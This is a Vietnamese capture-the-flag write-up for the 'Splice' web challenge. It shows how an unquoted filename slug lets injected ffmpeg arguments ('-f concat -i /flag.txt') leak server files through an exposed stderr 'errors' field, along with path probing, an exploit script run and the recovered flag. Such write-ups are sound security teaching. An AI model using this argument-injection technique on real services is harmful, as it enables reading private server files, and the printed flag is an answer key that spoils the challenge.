# Splice - Web (Hard)

**Flag:** `WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}` (Điểm: 300 pts)
**Môi trường:** H7TEX 2026 host trên nền tảng WebVerse
**Máy chủ mục tiêu:** `https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com` (Hệ thống Express, chạy sau proxy Cloudflare)
**Tài nguyên:** Không có mã nguồn nào. Toàn bộ phân tích dựa trên mã nguồn thu thập từ ứng dụng qua các đường `/studio`, `/public/css/site.css`, và cấu trúc JSON trích xuất từ `/api/render`.

## Đề bài

Bối cảnh: Hệ thống Tapedeck cung cấp dịch vụ podcast hosting. Cổng Studio cho phép tải lên một đoạn âm thanh, xử lý để tạo audiogram (poster) và tải về.
Yêu cầu: *"Hãy kiểm tra quá trình render đặt tên và xử lý các tệp trả về như thế nào"*. Nền tảng gợi ý lỗi là CMDI (Command Injection - Tiêm lệnh hệ thống).
Lưu ý: Cờ (flag) lưu trữ trên máy chủ, người chơi không có file phân tích offline.

## Phân tích

Giao diện `/studio` cho thấy 3 công đoạn của quy trình (pipeline):

```html
<form method="post" action="/studio/upload" enctype="multipart/form-data">
  <input type="file" name="clip" accept="audio/*">
</form>

<p class="sub">The export name is used as the poster filename.</p>
<!-- Tên xuất ra sẽ được dùng làm tên tệp poster -->
<input id="slugInput" name="slug" value="audiogram">
```

JS script gọi API `/api/render`:

```js
fetch('/api/render', {method:'POST', headers:{'Content-Type':'application/json'},
  body: JSON.stringify({slug: ..., theme: ...})})
  .then(...)
  // Ghi chú quan trọng: API này CÓ trả về trường `errors` nếu có lỗi (failure). 
  // Tuy nhiên giao diện UI ẩn trường này đi.
```

Hai điểm yếu bảo mật:
1. Trường xuất tên (export name) được sử dụng trực tiếp làm tên file đầu ra.
2. API thực chất có luồng trả về lỗi (field `errors`) nhưng giao diện UI ẩn thông báo lỗi -> Gọi trực tiếp API bằng JSON sẽ nhận được phản hồi lỗi `stderr` quan trọng.

Thử nghiệm cơ bản: Sử dụng một file WAV 2 giây tạo tự động, gửi yêu cầu render kèm `slug=audiogram`:

```json
{"ok": true, "outputs": [{"file": "audiogram.png", "url": "/m/b9f13764512c81b7/audiogram.png"}], "errors": null}
```

## Lời giải

**Bước 1 - Xác định lỗ hổng tiêm tham số.**
Lỗ hổng Command Injection không cho phép thực thi shell, nhưng cho phép chèn tham số (argv):

```text
Thử payload: slug = "x -h"
Phản hồi lỗi errors: "Unrecognized option 'h.png'.
         Error splitting the argument list: Option not found"
```

Cụm `-h.png` xuất hiện như một tham số argv độc lập. Minh chứng: Chuỗi lệnh đã được phân tách bằng dấu khoảng trắng trước khi chuyển vào `ffmpeg`. Và vì phần tên file `slug + ".png"` không bị bao bọc trong ngoặc kép (quote), dữ liệu phía sau dấu cách sẽ trở thành tham số điều khiển mới cho `ffmpeg`.

**Bước 2 - Khai thác trích xuất file.**
Sử dụng các cờ của tham số tiêm, ta có 2 phương pháp: dùng `-i` để chỉ định file đầu vào (input), hoặc dùng `-f` để thay đổi demuxer. Sử dụng tính năng concat demuxer của `ffmpeg` là phương pháp hiệu quả nhất để đọc file đích:

```text
Payload: slug = "a.png -f concat -i /flag.txt b.png"
```

Đặc điểm của concat demuxer là nó yêu cầu file đầu vào có cấu trúc cụ thể, định dạng mỗi dòng phải là `file '...'` hoặc `duration n`. Dòng đầu tiên của `/flag.txt` không khớp định dạng. Do đó, `ffmpeg` sẽ trả lỗi và hiển thị nội dung dòng lỗi này vào báo cáo:

```text
[concat @ 0x6145f8caea80] Dòng 1 (Line 1): từ khóa không nhận diện 'WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}'
/flag.txt: Invalid data found when processing input
```
Server đưa `stderr` vào trường `errors`, nên có thể đọc flag trực tiếp trong response.

**Bước 3 - Xác định đường dẫn của cờ.**
Cùng một phương thức tiêm, ta có thể kiểm tra một file có tồn tại hay không thông qua phản hồi lỗi của hệ thống:

```text
/flag.txt              -> Lỗi: Dòng 1 (Line 1) unknown keyword 'WEBVERSE{...}' (TỒN TẠI)
/flag                  -> Lỗi: No such file or directory (Không tồn tại)
/opt/app/flag.txt      -> Lỗi: No such file or directory
/app/flag.txt          -> Lỗi: No such file or directory
./flag.txt             -> Lỗi: No such file or directory
```

**Bước 4 - Kiểm chứng độc lập.**
Kịch bản `exploit.py` được thiết kế để tự động khởi tạo phiên giao dịch (session) mới (cookie `td_session` sẽ tạo workspace riêng). Script tự động tạo file WAV, upload lên và gửi yêu cầu render.
Thử nghiệm trên một workspace hoàn toàn độc lập (`0d6a6fc0562fc2eb`), khác biệt so với lúc thử nghiệm dò đường (`b9f13764512c81b7`), hệ thống trả về đúng chuỗi cờ. Công đoạn trích xuất cờ qua biểu thức regex từ phản hồi và lưu vào `flag.txt`.

## Kết quả
```bash
python exploit.py https://ced0f13a-5765-splice-5ba63.mystery-challenges.webverselabs-pro.com
```

Quá trình thực thi:
```text
[*] Xác định session: td_session=s%3Af9iYs9oShh5WGUU6amVzf3gfG...
[*] Upload -> Phản hồi HTTP 200
[*] Render -> Phản hồi HTTP 200
[+] Thu được WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
```

```text
WEBVERSE{fcb61c06cbb7cd020a371730b71521fe}
```

(Lưu ý: Mang kết quả nộp tại ô SUBMIT FLAG trên cổng WebVerse (`/e/YfQq-BkjAX1I9bECP5U9xcsY/c/28`). Quá trình kiểm tra đồng bộ có thể mất 60 giây để hệ thống xác nhận về H7TEX).
